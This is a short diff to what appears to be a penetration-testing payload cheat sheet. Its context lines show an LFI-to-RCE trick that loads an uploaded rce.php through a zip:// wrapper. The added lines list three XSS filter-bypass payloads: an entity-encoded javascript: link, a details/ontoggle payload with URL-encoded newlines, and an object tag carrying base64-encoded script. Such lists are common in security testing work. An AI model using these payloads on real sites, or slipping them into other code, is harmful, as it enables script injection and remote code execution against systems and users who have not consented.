@@ -152,5 +152,13 @@ If you can upload .zip file on target then:
 
 ( https://<target Site>.com/index.php?page=zip://path/file.zip#rce.php )
 
+# new by y000!
 
+xss payloads
+
+<a href=javas&#99;ript:alert(1)>
+
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 
